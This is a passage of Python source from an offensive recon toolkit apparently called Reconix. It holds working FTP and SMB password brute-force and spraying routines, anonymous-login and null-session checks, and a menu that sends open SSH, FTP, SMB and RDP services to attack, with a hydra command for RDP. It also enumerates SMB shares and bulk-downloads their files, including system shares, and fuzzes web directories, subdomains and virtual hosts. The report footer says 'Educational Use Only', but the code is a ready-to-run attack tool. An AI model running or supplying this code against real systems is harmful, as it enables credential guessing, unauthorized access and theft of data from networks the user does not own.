        user = input(f"{CYAN}Enter username: {RESET}")
        pass_list = input(f"{CYAN}Enter path to password list: {RESET}")
        try:
            with open(pass_list, 'r') as p:
                passwords = [line.strip() for line in p if line.strip()]
        except FileNotFoundError:
            print_status(f"Password file not found: {pass_list}", 'error')
            return
        print_status(f"Loaded {len(passwords)} passwords", 'info')
        print(f"\n{YELLOW}[~] Testing user '{user}' on {target_ip}:21...{RESET}\n")
        found = False
        for password in passwords:
            try:
                ftp = ftplib.FTP()
                ftp.connect(target_ip, 21, timeout=5)
                ftp.login(user, password)
                print(f"{GREEN}[+] SUCCESS! User: {BOLD}{user}{RESET}{GREEN} | Password: {BOLD}{password}{RESET}")
                found = True
                ftp.quit()
                return
            except ftplib.error_perm:
                print(f"{RED}[-]{RESET} Failed: {password}")
            except Exception:
                print(f"{RED}[-]{RESET} Connection error: {password}")
            finally:
                try:
                    ftp.quit()
                except:
                    pass
        if not found:
            print_status("No valid credentials found", 'warning')
    elif attack_type == 3:
        print(f"\n{YELLOW}[~] Testing anonymous login on {target_ip}:21...{RESET}\n")
        try:
            ftp = ftplib.FTP()
            ftp.connect(target_ip, 21, timeout=5)
            ftp.login('anonymous', 'anonymous@')
            print(f"{GREEN}[+] Anonymous login SUCCESSFUL!{RESET}")
            ftp.quit()
        except:
            print(f"{RED}[-] Anonymous login failed{RESET}")

def attacking_smb(target_ip):
    try:
        from impacket.smbconnection import SMBConnection
    except ImportError:
        print_status("impacket not installed! Install: pip3 install impacket", 'error')
        return
    print(f"\n{YELLOW}Attack Mode:{RESET}")
    print(f"{GREEN}[1]{RESET} Full Brute Force (user_list + pass_list)")
    print(f"{GREEN}[2]{RESET} User Spray (single_user + pass_list)")
    print(f"{GREEN}[3]{RESET} Null Session Test")
    try:
        attack_type = int(input(f"\n{CYAN}Select attack mode: {RESET}"))
    except ValueError:
        print_status("Invalid input!", 'error')
        return
    if attack_type == 1:
        user_list = input(f"{CYAN}Enter path to username list: {RESET}")
        pass_list = input(f"{CYAN}Enter path to password list: {RESET}")
        try:
            with open(user_list, 'r') as u:
                users = [line.strip() for line in u if line.strip()]
            with open(pass_list, 'r') as p:
                passwords = [line.strip() for line in p if line.strip()]
        except FileNotFoundError as e:
            print_status(f"File not found: {e}", 'error')
            return
        print_status(f"Loaded {len(users)} users and {len(passwords)} passwords", 'info')
        print(f"\n{YELLOW}[~] Starting brute force attack on {target_ip}:445...{RESET}\n")
        found = False
        for user in users:
            for password in passwords:
                try:
                    conn = SMBConnection(target_ip, target_ip, timeout=5)
                    conn.login(user, password)
                    print(f"{GREEN}[+] SUCCESS! User: {BOLD}{user}{RESET}{GREEN} | Password: {BOLD}{password}{RESET}")
                    found = True
                    conn.logoff()
                    return
                except Exception:
                    print(f"{RED}[-]{RESET} Failed: {user}:{password}")
                finally:
                    try:
                        conn.logoff()
                    except:
                        pass
        if not found:
            print_status("No valid credentials found", 'warning')
    elif attack_type == 2:
        user = input(f"{CYAN}Enter username: {RESET}")
        pass_list = input(f"{CYAN}Enter path to password list: {RESET}")
        try:
            with open(pass_list, 'r') as p:
                passwords = [line.strip() for line in p if line.strip()]
        except FileNotFoundError:
            print_status(f"Password file not found: {pass_list}", 'error')
            return
        print_status(f"Loaded {len(passwords)} passwords", 'info')
        print(f"\n{YELLOW}[~] Testing user '{user}' on {target_ip}:445...{RESET}\n")
        found = False
        for password in passwords:
            try:
                conn = SMBConnection(target_ip, target_ip, timeout=5)
                conn.login(user, password)
                print(f"{GREEN}[+] SUCCESS! User: {BOLD}{user}{RESET}{GREEN} | Password: {BOLD}{password}{RESET}")
                found = True
                conn.logoff()
                return
            except Exception:
                print(f"{RED}[-]{RESET} Failed: {password}")
            finally:
                try:
                    conn.logoff()
                except:
                    pass
        if not found:
            print_status("No valid credentials found", 'warning')
    elif attack_type == 3:
        print(f"\n{YELLOW}[~] Testing null session on {target_ip}:445...{RESET}\n")
        try:
            conn = SMBConnection(target_ip, target_ip, timeout=5)
            conn.login('', '')
            print(f"{GREEN}[+] Null session SUCCESSFUL!{RESET}")
            conn.logoff()
        except:
            print(f"{RED}[-] Null session failed{RESET}")

def brute_force_attack(scan_results):
    """Enhanced brute force module with accurate port/service naming"""
    print(f"\n{BOLD}{RED}╔══════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{BOLD}{RED}║           🔨 BRUTE FORCE MODULE                              ║{RESET}")
    print(f"{BOLD}{RED}╚══════════════════════════════════════════════════════════════╝{RESET}\n")

    # Port number -> friendly display name
    PORT_DISPLAY_NAMES = {
        21:   'FTP',
        22:   'SSH',
        445:  'SMB',
        3389: 'RDP',
    }

    services_found = []
    i = 0

    print(f"{YELLOW}Scanning for bruteforceable services...{RESET}\n")

    for result in scan_results:
        host_printed = False
        for port in result['ports']:
            if port['state'] != 'open':
                continue

            port_num = port['port']
            svc_name = port['service'].lower()
            attack_type = None

            # Determine attack type: prefer port-based lookup, fall back to service name
            if port_num in PORT_SERVICE_MAP:
                attack_type = BRUTEFORCE_SERVICE_MAP.get(PORT_SERVICE_MAP[port_num])
            else:
                attack_type = BRUTEFORCE_SERVICE_MAP.get(svc_name)

            if attack_type is None:
                continue

            # Build a clean display name
            if port_num in PORT_DISPLAY_NAMES:
                display_name = PORT_DISPLAY_NAMES[port_num]
            else:
                display_name = svc_name.upper()

            if not host_printed:
                print(f"{BLUE}║{RESET} Host: {CYAN}{result['ip']}{RESET}")
                host_printed = True

            print(f"{GREEN}  [{i}]{RESET} {display_name} on port {YELLOW}{port_num}{RESET}")
            services_found.append((result['ip'], port_num, attack_type))
            i += 1

    if not services_found:
        print_status("No bruteforceable services found!", 'warning')
        print(f"\n{YELLOW}Note: Bruteforceable services include:{RESET}")
        print("  • SSH  (port 22)")
        print("  • FTP  (port 21)")
        print("  • SMB  (port 445)")
        print("  • RDP  (port 3389)")
        input(f"\n{YELLOW}Press Enter to continue...{RESET}")
        return

    print(f"\n{BOLD}{WHITE}{'─'*70}{RESET}\n")

    try:
        choice = int(input(f"{CYAN}Select service to attack (0 to cancel): {RESET}"))
        if choice < 0 or choice >= len(services_found):
            return

        target_ip, target_port, target_service = services_found[choice]

        if target_port in PORT_DISPLAY_NAMES:
            display = PORT_DISPLAY_NAMES[target_port]
        else:
            display = target_service.upper()

        print(f"\n{YELLOW}Target: {CYAN}{target_ip}:{target_port}{RESET} ({display})")

        if target_service == 'ssh':
            attacking_ssh(target_ip)
        elif target_service == 'ftp':
            attacking_ftp(target_ip)
        elif target_service == 'smb':
            attacking_smb(target_ip)
        elif target_service == 'rdp':
            print_status("RDP brute force requires additional tools (hydra/ncrack)", 'info')
            print(f"\n{CYAN}Example: hydra -L users.txt -P passwords.txt rdp://{target_ip}{RESET}")

    except ValueError:
        print_status("Invalid input!", 'error')
    except KeyboardInterrupt:
        print(f"\n\n{YELLOW}Attack cancelled by user{RESET}")
    except Exception as e:
        print_status(f"Error: {e}", 'error')

    input(f"\n{YELLOW}Press Enter to continue...{RESET}")

def generate_security_report(scan_results):
    """Generate professional HTML report with charts"""
    print(f"\n{BOLD}{BLUE}╔══════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{BOLD}{BLUE}║           📊 SECURITY REPORT GENERATOR                       ║{RESET}")
    print(f"{BOLD}{BLUE}╚══════════════════════════════════════════════════════════════╝{RESET}\n")

    reports_dir = ensure_reports_directory()
    filename = os.path.join(reports_dir, f"security_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html")

    total_hosts = len(scan_results)
    total_open_ports = sum(len([p for p in r['ports'] if p['state'] == 'open']) for r in scan_results)
    total_vulns = sum(len(p['vulnerabilities']) for r in scan_results for p in r['ports'])

    service_counts = {}
    port_status = {'open': 0, 'filtered': 0, 'closed': 0}
    risk_levels = {'critical': 0, 'high': 0, 'medium': 0, 'low': 0}

    for result in scan_results:
        for port in result['ports']:
            port_status[port['state']] = port_status.get(port['state'], 0) + 1
            if port['state'] == 'open':
                service = port['service']
                service_counts[service] = service_counts.get(service, 0) + 1
                if port['vulnerabilities']:
                    if 'RCE' in str(port['vulnerabilities']) or 'Execution' in str(port['vulnerabilities']):
                        risk_levels['critical'] += 1
                    elif 'CVE' in str(port['vulnerabilities']):
                        risk_levels['high'] += len(port['vulnerabilities'])
                    else:
                        risk_levels['medium'] += len(port['vulnerabilities'])

    service_labels = list(service_counts.keys())[:10]
    service_data = [service_counts[s] for s in service_labels]

    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Reconix Security Report</title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js@3.9.1/dist/chart.min.js"></script>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 20px; color: #333; }}
        .container {{ max-width: 1400px; margin: 0 auto; background: white; border-radius: 15px; box-shadow: 0 10px 40px rgba(0,0,0,0.3); overflow: hidden; }}
        .header {{ background: linear-gradient(135deg, #2c3e50 0%, #34495e 100%); color: white; padding: 40px; text-align: center; }}
        .header h1 {{ font-size: 3em; margin-bottom: 10px; }}
        .stats-grid {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; padding: 30px; background: #f8f9fa; }}
        .stat-card {{ background: white; padding: 25px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); text-align: center; }}
        .stat-number {{ font-size: 3em; font-weight: bold; margin: 10px 0; }}
        .stat-label {{ color: #666; font-size: 1.1em; text-transform: uppercase; letter-spacing: 1px; }}
        .hosts {{ color: #3498db; }} .ports {{ color: #2ecc71; }} .vulns {{ color: #e74c3c; }} .services {{ color: #f39c12; }}
        .charts-section {{ padding: 30px; display: grid; grid-template-columns: repeat(auto-fit, minmax(400px, 1fr)); gap: 30px; }}
        .chart-container {{ background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }}
        .chart-title {{ font-size: 1.5em; margin-bottom: 15px; color: #2c3e50; text-align: center; }}
        .host-section {{ padding: 30px; }}
        .host-card {{ background: white; margin: 20px 0; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); overflow: hidden; }}
        .host-header {{ background: linear-gradient(135deg, #3498db 0%, #2980b9 100%); color: white; padding: 20px; font-size: 1.3em; }}
        .host-info {{ padding: 20px; border-bottom: 1px solid #e0e0e0; }}
        .info-row {{ display: flex; margin: 10px 0; }}
        .info-label {{ font-weight: bold; width: 150px; color: #555; }}
        .ports-table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
        .ports-table th {{ background: #34495e; color: white; padding: 15px; text-align: left; }}
        .ports-table td {{ padding: 12px 15px; border-bottom: 1px solid #e0e0e0; }}
        .ports-table tr:hover {{ background: #f8f9fa; }}
        .status-open {{ color: #27ae60; font-weight: bold; }}
        .vuln-badge {{ display: inline-block; background: #e74c3c; color: white; padding: 5px 10px; border-radius: 5px; font-size: 0.9em; margin: 5px 5px 5px 0; }}
        .vuln-critical {{ background: #c0392b; }} .vuln-high {{ background: #e74c3c; }}
        .footer {{ background: #2c3e50; color: white; padding: 20px; text-align: center; }}
        canvas {{ max-height: 300px; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔒 Reconix Security Report</h1>
            <p>Generated: {datetime.now().strftime('%B %d, %Y at %H:%M:%S')}</p>
        </div>
        <div class="stats-grid">
            <div class="stat-card"><div class="stat-label">Total Hosts</div><div class="stat-number hosts">{total_hosts}</div></div>
            <div class="stat-card"><div class="stat-label">Open Ports</div><div class="stat-number ports">{total_open_ports}</div></div>
            <div class="stat-card"><div class="stat-label">Vulnerabilities</div><div class="stat-number vulns">{total_vulns}</div></div>
            <div class="stat-card"><div class="stat-label">Services</div><div class="stat-number services">{len(service_counts)}</div></div>
        </div>
        <div class="charts-section">
            <div class="chart-container"><h3 class="chart-title">Port Status Distribution</h3><canvas id="portStatusChart"></canvas></div>
            <div class="chart-container"><h3 class="chart-title">Risk Level Distribution</h3><canvas id="riskChart"></canvas></div>
            <div class="chart-container"><h3 class="chart-title">Top Services Detected</h3><canvas id="servicesChart"></canvas></div>
            <div class="chart-container"><h3 class="chart-title">Hosts Overview</h3><canvas id="hostsChart"></canvas></div>
        </div>
        <div class="host-section">
            <h2 style="text-align:center;margin-bottom:30px;color:#2c3e50;">Detailed Host Information</h2>
"""
    for result in scan_results:
        open_ports = [p for p in result['ports'] if p['state'] == 'open']
        vuln_count = sum(len(p['vulnerabilities']) for p in open_ports)
        html += f"""
            <div class="host-card">
                <div class="host-header">🖥️ {result['ip']} {f"({result['hostname']})" if result['hostname'] != 'Unknown' else ''}</div>
                <div class="host-info">
                    <div class="info-row"><span class="info-label">Operating System:</span><span>{result['os']}</span></div>
                    <div class="info-row"><span class="info-label">Scan Time:</span><span>{result['scan_time']}</span></div>
                    <div class="info-row"><span class="info-label">Open Ports:</span><span class="ports">{len(open_ports)}</span></div>
                    <div class="info-row"><span class="info-label">Vulnerabilities:</span><span class="vulns">{vuln_count}</span></div>
                </div>
"""
        if open_ports:
            html += """<table class="ports-table"><thead><tr><th>Port</th><th>Service</th><th>Version</th><th>Status</th><th>Vulnerabilities</th></tr></thead><tbody>"""
            for port in open_ports:
                html += f"""<tr><td><strong>{port['port']}</strong></td><td>{port['service']}</td><td>{port['version'][:50]}</td><td class="status-open">OPEN</td><td>"""
                if port['vulnerabilities']:
                    for vuln in port['vulnerabilities']:
                        severity = 'critical' if 'RCE' in vuln or 'Execution' in vuln else 'high'
                        html += f'<span class="vuln-badge vuln-{severity}">{vuln}</span>'
                else:
                    html += '<span style="color:#27ae60;">✓ No known vulnerabilities</span>'
                html += """</td></tr>"""
            html += """</tbody></table>"""
        html += """</div>"""

    html += f"""
        </div>
        <div class="footer">
            <p>Generated by Reconix v2.0 Enhanced | Educational Use Only</p>
            <p style="margin-top:10px;opacity:0.8;">For authorized security testing only</p>
        </div>
    </div>
    <script>
        new Chart(document.getElementById('portStatusChart').getContext('2d'), {{
            type: 'doughnut',
            data: {{ labels: ['Open','Filtered','Closed'], datasets: [{{ data: [{port_status.get('open',0)},{port_status.get('filtered',0)},{port_status.get('closed',0)}], backgroundColor: ['#27ae60','#f39c12','#95a5a6'] }}] }},
            options: {{ responsive: true, maintainAspectRatio: true, plugins: {{ legend: {{ position: 'bottom' }} }} }}
        }});
        new Chart(document.getElementById('riskChart').getContext('2d'), {{
            type: 'bar',
            data: {{ labels: ['Critical','High','Medium','Low'], datasets: [{{ label: 'Vulnerabilities', data: [{risk_levels['critical']},{risk_levels['high']},{risk_levels['medium']},{risk_levels['low']}], backgroundColor: ['#c0392b','#e74c3c','#f39c12','#3498db'] }}] }},
            options: {{ responsive: true, maintainAspectRatio: true, plugins: {{ legend: {{ display: false }} }}, scales: {{ y: {{ beginAtZero: true }} }} }}
        }});
        new Chart(document.getElementById('servicesChart').getContext('2d'), {{
            type: 'bar',
            data: {{ labels: {json.dumps(service_labels)}, datasets: [{{ label: 'Count', data: {json.dumps(service_data)}, backgroundColor: '#3498db' }}] }},
            options: {{ indexAxis: 'y', responsive: true, maintainAspectRatio: true, plugins: {{ legend: {{ display: false }} }}, scales: {{ x: {{ beginAtZero: true }} }} }}
        }});
        new Chart(document.getElementById('hostsChart').getContext('2d'), {{
            type: 'pie',
            data: {{ labels: ['Hosts with Vulns','Secure Hosts'], datasets: [{{ data: [{sum(1 for r in scan_results if any(p['vulnerabilities'] for p in r['ports']))},{sum(1 for r in scan_results if not any(p['vulnerabilities'] for p in r['ports']))}], backgroundColor: ['#e74c3c','#27ae60'] }}] }},
            options: {{ responsive: true, maintainAspectRatio: true, plugins: {{ legend: {{ position: 'bottom' }} }} }}
        }});
    </script>
</body>
</html>"""

    try:
        with open(filename, 'w') as f:
            f.write(html)
        print_status(f"Report saved: {GREEN}{filename}{RESET}", 'success')
        open_now = input(f"\n{CYAN}Open report in browser? (y/n): {RESET}").lower()
        if open_now == 'y':
            try:
                os.system(f"xdg-open {filename} 2>/dev/null || open {filename} 2>/dev/null")
                print_status("Opening report in browser...", 'info')
            except:
                pass
    except Exception as e:
        print_status(f"Error: {e}", 'error')

    input(f"\n{YELLOW}Press Enter to continue...{RESET}")

def smb_enumeration(scan_results):
    """SMB Share Enumeration and Download"""
    print(f"\n{BOLD}{CYAN}╔══════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{BOLD}{CYAN}║           🗂️  SMB SHARE ENUMERATION                          ║{RESET}")
    print(f"{BOLD}{CYAN}╚══════════════════════════════════════════════════════════════╝{RESET}\n")

    smb_hosts = []
    for result in scan_results:
        for port in result['ports']:
            if port['state'] == 'open' and port['port'] in [139, 445]:
                smb_hosts.append(result['ip'])
                break

    if not smb_hosts:
        print_status("No SMB services found!", 'warning')
        input(f"\n{YELLOW}Press Enter to continue...{RESET}")
        return

    print(f"{YELLOW}SMB Hosts Found:{RESET}\n")
    for idx, host in enumerate(smb_hosts, 1):
        print(f"{GREEN}[{idx}]{RESET} {host}")

    try:
        choice = int(input(f"\n{CYAN}Select host (0=cancel): {RESET}"))
        if choice == 0 or choice > len(smb_hosts):
            return

        target = smb_hosts[choice - 1]

        print(f"\n{YELLOW}Authentication Method:{RESET}\n")
        print(f"{GREEN}[1]{RESET} Anonymous Login")
        print(f"{GREEN}[2]{RESET} Login with Credentials")

        auth_choice = int(input(f"\n{CYAN}Select option: {RESET}"))

        if auth_choice not in [1, 2]:
            print_status("Invalid option!", 'error')
            return

        username = ""
        password = ""

        if auth_choice == 1:
            print(f"\n{YELLOW}[~] Attempting anonymous login to {target}...{RESET}\n")
        else:
            print(f"\n{YELLOW}Enter Credentials:{RESET}")
            username = input(f"{CYAN}Username: {RESET}")
            import getpass
            password = getpass.getpass(f"{CYAN}Password: {RESET}")
            print(f"\n{YELLOW}[~] Attempting login to {target} as '{username}'...{RESET}\n")

        try:
            from impacket.smbconnection import SMBConnection
        except ImportError:
            print_status("impacket not installed! Install: pip3 install impacket", 'error')
            input(f"\n{YELLOW}Press Enter to continue...{RESET}")
            return

        try:
            conn = SMBConnection(target, target, timeout=10)
            if username:
                conn.login(username, password)
                print_status(f"Successfully authenticated as '{username}'", 'success')
            else:
                conn.login('', '')
                print_status("Anonymous login successful!", 'success')

            print(f"\n{BOLD}{CYAN}{'='*70}{RESET}")
            print(f"{BOLD}{CYAN}                    AVAILABLE SHARES{RESET}")
            print(f"{BOLD}{CYAN}{'='*70}{RESET}\n")

            shares = conn.listShares()
            accessible_shares = []
            system_shares_found = []

            for share in shares:
                share_name = share['shi1_netname'][:-1]
                is_system_share = share_name in SYSTEM_SHARES
                try:
                    conn.listPath(share_name, '/*')
                    access_status = f"{GREEN}[ACCESSIBLE]{RESET}"
                    if is_system_share:
                        system_shares_found.append(share_name)
                    else:
                        accessible_shares.append(share_name)
                except:
                    access_status = f"{RED}[NO ACCESS]{RESET}"
                share_comment = share['shi1_remark'][:-1] if share['shi1_remark'] else "No description"
                share_type = f"{YELLOW}[SYSTEM]{RESET}" if is_system_share else f"{BLUE}[USER]{RESET}"
                print(f"  {share_type} {CYAN}{share_name:<20}{RESET} {access_status}")
                print(f"         Comment: {share_comment}\n")

            if not accessible_shares and not system_shares_found:
                print_status("No accessible shares found!", 'warning')
                conn.logoff()
                input(f"\n{YELLOW}Press Enter to continue...{RESET}")
                return

            print(f"{BOLD}{CYAN}{'='*70}{RESET}\n")

            if system_shares_found:
                print(f"{YELLOW}[!] {len(system_shares_found)} system share(s) accessible{RESET}\n")
            if accessible_shares:
                print_status(f"Found {len(accessible_shares)} user share(s) accessible", 'success')

            print(f"\n{YELLOW}Download Options:{RESET}\n")
            if accessible_shares:
                print(f"{GREEN}[1]{RESET} Download User Shares Only (Recommended)")
            if system_shares_found:
                print(f"{GREEN}[2]{RESET} Download System Shares (Advanced)")
            print(f"{GREEN}[3]{RESET} Download Specific Share")
            print(f"{GREEN}[0]{RESET} Skip Download")

            download_choice = int(input(f"\n{CYAN}Select option: {RESET}"))

            if download_choice == 0:
                conn.logoff()
                return

            reports_dir = ensure_reports_directory()
            default_output = os.path.join(reports_dir, f"smb_{target}")
            output_dir = input(f"\n{CYAN}Output directory (default: {default_output}): {RESET}").strip()
            if not output_dir:
                output_dir = default_output
            os.makedirs(output_dir, exist_ok=True)

            def download_share_contents(conn, share_name, local_path, indent=0, max_depth=10):
                if indent >= max_depth:
                    print(f"{'  '*indent}{YELLOW}[WARN]{RESET} Maximum depth reached")
                    return
                try:
                    files = conn.listPath(share_name, '/*')
                    for f in files:
                        filename = f.get_longname()
                        if filename in ['.', '..']:
                            continue
                        remote_path = f"\\{filename}"
                        local_file_path = os.path.join(local_path, filename)
                        if f.is_directory():
                            print(f"{'  '*indent}{BLUE}[DIR]{RESET}  {filename}")
                            os.makedirs(local_file_path, exist_ok=True)
                            download_share_contents(conn, share_name, local_file_path, indent + 1, max_depth)
                        else:
                            try:
                                file_size = f.get_filesize()
                                size_str = f"{file_size/1024/1024:.2f}MB" if file_size > 1024*1024 else f"{file_size/1024:.2f}KB"
                                print(f"{'  '*indent}{GREEN}[FILE]{RESET} {filename} ({size_str})")
                                with open(local_file_path, 'wb') as lf:
                                    conn.getFile(share_name, remote_path, lf.write)
                            except Exception as e:
                                print(f"{'  '*indent}{RED}[FAIL]{RESET} {filename} - {str(e)[:50]}")
                except Exception as e:
                    print_status(f"Error listing {share_name}: {str(e)[:100]}", 'error')

            shares_to_download = []

            if download_choice == 1 and accessible_shares:
                shares_to_download = accessible_shares
            elif download_choice == 2 and system_shares_found:
                confirm = input(f"{YELLOW}Download system shares? (yes/no): {RESET}").lower()
                if confirm != 'yes':
                    conn.logoff()
                    return
                shares_to_download = system_shares_found
            elif download_choice == 3:
                all_shares = accessible_shares + system_shares_found
                print(f"\n{YELLOW}Accessible Shares:{RESET}\n")
                for idx, sn in enumerate(all_shares, 1):
                    tag = "[SYSTEM]" if sn in system_shares_found else "[USER]"
                    print(f"{GREEN}[{idx}]{RESET} {tag} {sn}")
                share_idx = int(input(f"\n{CYAN}Select share to download: {RESET}"))
                if share_idx < 1 or share_idx > len(all_shares):
                    print_status("Invalid selection!", 'error')
                    conn.logoff()
                    return
                selected_share = all_shares[share_idx - 1]
                if selected_share in system_shares_found:
                    confirm = input(f"{YELLOW}System share - continue? (yes/no): {RESET}").lower()
                    if confirm != 'yes':
                        conn.logoff()
                        return
                shares_to_download = [selected_share]

            for share_name in shares_to_download:
                print(f"\n{BOLD}{CYAN}[Downloading Share: {share_name}]{RESET}\n")
                share_dir = os.path.join(output_dir, share_name.replace('$', '_'))
                os.makedirs(share_dir, exist_ok=True)
                max_depth = 3 if share_name in system_shares_found else 10
                download_share_contents(conn, share_name, share_dir, max_depth=max_depth)

            print(f"\n{BOLD}{GREEN}{'='*70}{RESET}")
            print(f"{BOLD}{GREEN}                    DOWNLOAD COMPLETE!{RESET}")
            print(f"{BOLD}{GREEN}{'='*70}{RESET}\n")
            print_status(f"Files saved to: {GREEN}{output_dir}{RESET}", 'success')
            conn.logoff()

        except Exception as e:
            print_status(f"SMB connection failed: {e}", 'error')

    except ValueError:
        print_status("Invalid input!", 'error')
    except KeyboardInterrupt:
        print(f"\n\n{YELLOW}Operation cancelled{RESET}")
    except Exception as e:
        print_status(f"Error: {e}", 'error')

    input(f"\n{YELLOW}Press Enter to continue...{RESET}")

def fuzzer_worker(queue, results, target_ip, protocol, mode, domain=None, baseline_size=None):
    import requests
    requests.packages.urllib3.disable_warnings()
    while not queue.empty():
        try:
            word = queue.get()
            if mode == "directory":
                url = f"{protocol}://{target_ip}/{word}"
                try:
                    response = requests.get(url, timeout=3, verify=False, allow_redirects=False)
                    if 200 <= response.status_code < 400:
                        status_color = GREEN if response.status_code == 200 else YELLOW
                        print(f"{status_color}[{response.status_code}]{RESET} {url}")
                        results.append((url, response.status_code))
                except:
                    pass
            elif mode == "subdomain":
                url = f"https://{word}.{domain}"
                try:
                    response = requests.get(url, timeout=3, verify=False, allow_redirects=False)
                    if 200 <= response.status_code < 400:
                        status_color = GREEN if response.status_code == 200 else YELLOW
                        print(f"{status_color}[{response.status_code}]{RESET} {url}")
                        results.append((url, response.status_code))
                except:
                    pass
            elif mode == "vhost":
                headers = {"Host": f"{word}.{domain}"}
                try:
                    response = requests.get(f"http://{target_ip}", headers=headers, timeout=3, verify=False)
                    response_size = len(response.content)
                    if response_size != baseline_size and response.status_code != 404:
                        print(f"{GREEN}[VHost Found]{RESET} {word}.{domain} {YELLOW}[Size: {response_size}]{RESET}")
                        results.append((f"{word}.{domain}", response_size))
                except:
                    pass
            queue.task_done()
        except:
            break

def web_application_scan(scan_results):
    import requests
    from queue import Queue
    import threading

    print(f"\n{BOLD}{MAGENTA}╔══════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{BOLD}{MAGENTA}║           🌐 WEB APPLICATION FUZZING                         ║{RESET}")
    print(f"{BOLD}{MAGENTA}╚══════════════════════════════════════════════════════════════╝{RESET}\n")

    web_hosts = []
    for result in scan_results:
        for port in result['ports']:
            if port['state'] == 'open' and port['service'] in ['http', 'https', 'ssl/http']:
                protocol = 'https' if 'ssl' in port['service'] or port['port'] == 443 else 'http'
                web_hosts.append({'host': result['ip'], 'port': port['port'], 'protocol': protocol})

    if not web_hosts:
        print_status("No web services found!", 'warning')
        input(f"\n{YELLOW}Press Enter to continue...{RESET}")
        return

    print(f"{YELLOW}Web Services:{RESET}")
    for idx, web in enumerate(web_hosts, 1):
        print(f"{GREEN}[{idx}]{RESET} {web['protocol']}://{web['host']}:{web['port']}")

    try:
        choice = int(input(f"\n{CYAN}Select target (0=cancel): {RESET}"))
        if choice == 0 or choice > len(web_hosts):
            return

        target = web_hosts[choice - 1]
        target_ip = target['host']
        protocol = target['protocol']

        print(f"\n{YELLOW}Fuzzing Modes:{RESET}")
        print(f"{GREEN}[1]{RESET} Directory Fuzzing")
        print(f"{GREEN}[2]{RESET} Subdomain Fuzzing")
        print(f"{GREEN}[3]{RESET} VHost Fuzzing")

        fuzz_mode = int(input(f"\n{CYAN}Select mode: {RESET}"))

        if fuzz_mode not in [1, 2, 3]:
            print_status("Invalid mode!", 'error')
            return

        print(f"\n{YELLOW}Intensity Levels:{RESET}")
        print(f"{GREEN}[1]{RESET} LOW    (~1,000 words)")
        print(f"{GREEN}[2]{RESET} MEDIUM (~20,000 words)")
        print(f"{GREEN}[3]{RESET} HIGH   (~100,000+ words)")

        intensity = int(input(f"\n{CYAN}Select intensity: {RESET}"))

        wordlist = None
        mode = None
        domain = None
        baseline_size = None

        if fuzz_mode == 1:
            mode = "directory"
            wordlists = {1: "/usr/share/seclists/Discovery/Web-Content/common.txt",
                         2: "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt",
                         3: "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt"}
            wordlist = wordlists.get(intensity)
        elif fuzz_mode == 2:
            mode = "subdomain"
            domain = input(f"\n{CYAN}Enter domain (e.g., example.com): {RESET}").strip()
            if not domain:
                print_status("Domain required!", 'error')
                return
            wordlists = {1: "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
                         2: "/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt",
                         3: "/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt"}
            wordlist = wordlists.get(intensity)
        elif fuzz_mode == 3:
            mode = "vhost"
            domain = input(f"\n{CYAN}Enter domain (e.g., example.com): {RESET}").strip()
            if not domain:
                print_status("Domain required!", 'error')
                return
            print(f"\n{YELLOW}[~] Getting baseline response...{RESET}")
            try:
                baseline = requests.get(f"http://{target_ip}", timeout=5, verify=False)
                baseline_size = len(baseline.content)
                print_status(f"Baseline size: {baseline_size} bytes", 'info')
            except Exception as e:
                print_status(f"Failed to get baseline: {e}", 'error')
                return
            wordlists = {1: "/usr/share/seclists/Discovery/Web-Content/common.txt",
                         2: "/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt",
                         3: "/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt"}
            wordlist = wordlists.get(intensity)

        if not wordlist:
            print_status("Invalid intensity!", 'error')
            return

        if not os.path.exists(wordlist):
            print_status(f"Wordlist not found: {wordlist}", 'error')
            alt_wordlist = input(f"{CYAN}Enter custom wordlist path (or Enter to cancel): {RESET}").strip()
            if alt_wordlist and os.path.exists(alt_wordlist):
                wordlist = alt_wordlist
            else:
                return

        print(f"\n{YELLOW}[~] Loading wordlist: {os.path.basename(wordlist)}{RESET}")
        queue = Queue()
        results = []

        try:
            with open(wordlist, 'r', errors='ignore') as w:
                for line in w:
                    word = line.strip()
                    if word and not word.startswith('#'):
                        queue.put(word)
        except Exception as e:
            print_status(f"Error reading wordlist: {e}", 'error')
            return

        total_words = queue.qsize()
        print_status(f"Loaded {total_words} words", 'success')
        print_status(f"Starting fuzzing with 30 threads...", 'scan')
        print()

        requests.packages.urllib3.disable_warnings()
        threads = []
        for i in range(30):
            t = threading.Thread(target=fuzzer_worker, args=(queue, results, target_ip, protocol, mode, domain, baseline_size))
            t.daemon = True
            t.start()
            threads.append(t)

        try:
            queue.join()
        except KeyboardInterrupt:
            print(f"\n\n{YELLOW}[!] Fuzzing interrupted by user{RESET}")

        print(f"\n{BOLD}{CYAN}{'='*70}{RESET}")
        print(f"{BOLD}{CYAN}                    FUZZING COMPLETE{RESET}")
        print(f"{BOLD}{CYAN}{'='*70}{RESET}\n")

        if results:
            print_status(f"Found {len(results)} results!", 'success')
            print()
            if mode in ["directory", "subdomain"]:
                for url, status in sorted(results, key=lambda x: x[1]):
